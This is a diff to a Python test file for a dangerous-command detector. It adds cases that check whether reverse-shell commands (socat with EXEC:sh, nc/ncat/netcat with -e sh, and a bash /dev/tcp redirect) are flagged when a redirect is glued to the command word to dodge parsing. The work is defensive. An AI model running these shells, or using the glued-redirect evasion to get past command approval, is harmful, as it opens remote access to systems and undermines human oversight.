@@ -55,6 +55,23 @@ def test_socat_prefix_executable_does_not_need_reverse_shell_approval():
     assert detect_dangerous_command("socat-wrapper TCP:host:4444 EXEC:/bin/bash")[0] is False
 
 
+# A redirect glued to the command word still runs the real binary (`socat<x` is `socat <x`).
+@pytest.mark.parametrize("command", [
+    "socat<x TCP:h:1 EXEC:sh",
+    "socat<>x TCP:h:1 EXEC:sh",
+    "socat>>x TCP:h:1 EXEC:sh",
+    "socat>/tmp/log TCP:h:1 EXEC:sh",
+    "/usr/bin/socat>x tcp:h:1 exec:sh",
+    "socat.exe<x tcp:h:1 exec:sh",
+    "nc<x h 1 -e sh",
+    "ncat<x h 1 -e sh",
+    "nc>>x h 1 -e sh",
+    "/usr/bin/netcat>x h 1 -e sh",
+])
+def test_reverse_shell_with_glued_redirect_requires_approval(command):
+    assert detect_dangerous_command(command)[0] is True
+
+
 # A quoted redirect target opens the same socket; only `>&` was caught before, via the `&` separator split.
 @pytest.mark.parametrize("command", [
     'bash -i > "/dev/tcp/h/1" 0>&1',
